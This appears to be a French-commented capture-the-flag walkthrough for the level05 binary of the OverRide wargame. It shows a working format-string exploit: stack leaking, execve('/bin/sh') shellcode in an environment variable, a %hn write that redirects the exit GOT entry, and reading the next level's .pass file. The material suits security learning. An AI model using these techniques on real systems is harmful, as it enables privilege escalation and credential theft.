@@ -1,0 +1,26 @@
+# On voit un printf et un exit juste apre on va donc changer la valeur du .got.plt pour jump sur notre adresse
+# On utilisera pas de caracteres en majuscule donc pas de probleme avec le xor
+
+level05@OverRide:~$ ./level05
+0000 %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+0000 64 f7fcfac0 f7ec3af9 ffffc67f ffffc67e 0 ffffffff ffffc704 f7fdb000 30303030 20782520 25207825 78252078 20782520 25207825
+
+# Offset 9
+
+export SHELLCODE=`python -c 'print("\x90" * 4096 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")'`
+
+# On recupere l'adresse au milieu des nop dans le shellcode dans la variable d'env: 0xFFFFD0AF
+
+# On ecrit la ligne
+
+python -c "print('\xe0\x97\x04\x08' + '\xff\xff\xff\xff' + '\xe2\x97\x04\x08' '%x' * 8 + '%53332x' + '%hn' + '%12112x' + '%hn')" > /tmp/file
+
+cat /tmp/file | ./level05
+
+cat /home/users/level06/.pass
+
+# -- DATA --
+# 0x080497e0 // la ou est l'adresse
+# 0x08048376 // adresse a changer
+# 0xFFFFD0AF // la ou jump
+
